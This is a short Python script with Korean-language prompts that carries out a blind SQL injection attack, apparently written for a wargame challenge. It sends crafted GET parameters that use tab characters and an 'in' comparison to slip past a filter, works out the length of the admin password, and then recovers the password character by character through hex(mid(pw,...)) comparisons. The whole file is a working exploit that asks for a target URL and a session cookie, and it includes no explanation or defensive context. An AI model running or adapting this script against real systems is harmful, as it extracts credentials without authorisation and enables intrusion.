import requests

def check_length(url, cookie):
    head = {"PHPSESSID":f"{cookie}"}
    print("대상 문자열의 길이를 확인중입니다..")
    for num in range(0,30):
        param=f"?no=0||id%09in%09(\"admin\")%26%26length(pw)>{num}%09%23"
        my_url=url+param
        res=requests.get(my_url, cookies=head)
        if("Hello admin" not in res.text):
            return num

def blind_sqli(url, cookie, length):
    head = {"PHPSESSID":f"{cookie}"}
    ans=""
    for len in range(1, length+1):
        print(f"{len}번째 문자에 대해 검색중입니다..")
        for ran in range(32,127):
            param=f"?no=0||id%09in%09(\"admin\")%26%26hex(mid(pw,{len},1))%09in%09(hex({ran}))%09%23"
            my_url=url+param
            res=requests.get(my_url, cookies=head)
            if("Hello admin" in res.text):
                print(f"{len}번째 문자 → {chr(ran)}")
                ans+=chr(ran)
                break
    return ans

if __name__ == "__main__":
    print("💘 Blind 공격을 시작합니다")
    
    url=input("URL을 입력하세요:")
    cookie=input("cookie를 알려주세요:")
    
    length=check_length(url, cookie)
    print(f"👏 pw의 길이는 {length}입니다.")
    
    ans=blind_sqli(url, cookie, length)
    print(f"👏 pw의 정체는 {ans}입니다!")
    
    exit
